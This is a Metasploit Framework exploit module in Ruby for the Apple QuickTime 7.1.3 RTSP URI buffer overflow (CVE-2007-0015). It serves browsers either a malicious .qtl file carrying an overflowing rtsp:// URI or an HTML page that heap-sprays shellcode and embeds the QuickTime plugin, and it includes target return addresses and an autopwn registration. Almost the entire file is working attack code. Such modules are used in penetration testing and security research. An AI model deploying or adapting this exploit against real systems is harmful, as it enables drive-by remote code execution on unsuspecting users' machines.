##
# $Id: apple_quicktime_rtsp.rb 9220 2010-05-04 23:09:32Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:os_name    => OperatingSystems::WINDOWS,
		:javascript => true,
		:rank       => NormalRanking, # reliable memory corruption
		:vuln_test  => nil,
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple QuickTime 7.1.3 RTSP URI Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Apple QuickTime
				7.1.3. This module was inspired by MOAB-01-01-2007.  The
				Browser target for this module was tested against IE 6 and
				Firefox 1.5.0.3 on Windows XP SP0/2; Firefox 3 blacklists the
				QuickTime plugin.
			},
			'Author'         => [ 'MC', 'egypt' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9220 $',
			'References'     =>
				[
					[ 'CVE', '2007-0015' ],
					[ 'OSVDB', '31023'],
					[ 'BID', '21829' ],
					[ 'URL', 'http://projects.info-pull.com/moab/MOAB-01-01-2007.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40\x5c",
				},
			'Platform' => 'win',
			'Targets'  =>
				[
					[ 'Automatic', { } ],
					[ 'Apple QuickTime Player 7.1.3',
						{
							'Ret' => 0x6855d8a2  # xpsp2/2k3 :( | vista ;)
						}
					],
					[ 'Browser Universal',
						{
							'Ret' => 0x0c0c0c0c # tested on xpsp0 and sp2
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 1 2007',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(client, request)

		return if ((p = regenerate_payload(client)) == nil)

		if (target.name =~ /Automatic/)
			if (request['User-Agent'] =~ /QuickTime/i)
				target = targets[1]
			else
				target = targets[2]
			end
		end

		cruft  =  rand_text_alphanumeric(4)
		# This is all basically filler on the browser target because we can't
		# expect the SEH to be in a reliable place across multiple browsers.
		# Heap spray ftw.
		sploit =  rand_text_english(307)
		sploit << p.encoded + "\xeb\x06" + rand_text_english(2)
		sploit << [target.ret].pack('V') + [0xe8, -485].pack('CV')

		if (request['User-Agent'] =~ /QuickTime/i or request.uri =~ /\.qtl$/)
			print_status("Sending #{self.name} exploit to #{client.peerhost}:#{client.peerport}...")
			print_status("Trying target #{target.name}...")
			content = build_qtl(sploit)
		else
			print_status("Sending #{self.name} init HTML to #{client.peerhost}:#{client.peerport}...")

			shellcode = Rex::Text.to_unescape(p.encoded)
			url =  ((datastore['SSL']) ? "https://" : "http://")
			url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(client.peerhost) : datastore['SRVHOST'])
			url << ":" + datastore['SRVPORT']
			url << get_resource
			js = <<-ENDJS
					#{js_heap_spray}
					sprayHeap(unescape("#{shellcode}"), 0x#{target.ret.to_s 16}, 0x4000);
				ENDJS
			content =  "<html><body><script><!--\n#{js}//--></script>"
			content << <<-ENDEMBED
					<OBJECT
					CLASSID="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"
					WIDTH="1"
					HEIGHT="1"
					CODEBASE="http://www.apple.com/qtactivex/qtplugin.cab">
					<PARAM name="SRC"        VALUE = "#{url}/#{cruft}.qtl">
					<PARAM name="QTSRC"      VALUE = "#{url}/#{cruft}.qtl">
					<PARAM name="AUTOPLAY"   VALUE = "true"               >
					<PARAM name="TYPE"       VALUE = "video/quicktime"    >
					<PARAM name="TARGET"     VALUE = "myself"             >
					<EMBED
						SRC        = "#{url}/#{cruft}.qtl"
						QTSRC      = "#{url}/#{cruft}.qtl"
						TARGET     = "myself"
						WIDTH      = "1"
						HEIGHT     = "1"
						AUTOPLAY   = "true"
						PLUGIN     = "quicktimeplugin"
						TYPE       = "video/quicktime"
						CACHE      = "false"
						PLUGINSPAGE= "http://www.apple.com/quicktime/download/" >
					</EMBED>
					</OBJECT>
				ENDEMBED
			content << "</body></html>"
		end

		send_response(client, content, { 'Content-Type' => "text/html" })

		# Handle the payload
		handler(client)
	end

	def build_qtl(overflow)
		cruft  =  rand_text_english(4)

		content =  "<?xml version=\"1.0\"?>\n"
		content << "<?quicktime type=\"application/x-quicktime-media-link\"?>\n"
		content << "<embed autoplay=\"true\" \n"
		content << "moviename=\"#{cruft}\" \n"
		content << "qtnext=\"#{cruft}\" \n"
		content << "type=\"video/quicktime\" \n"
		content << "src=\"rtsp://#{cruft}:#{overflow}\" />\n"

	end
end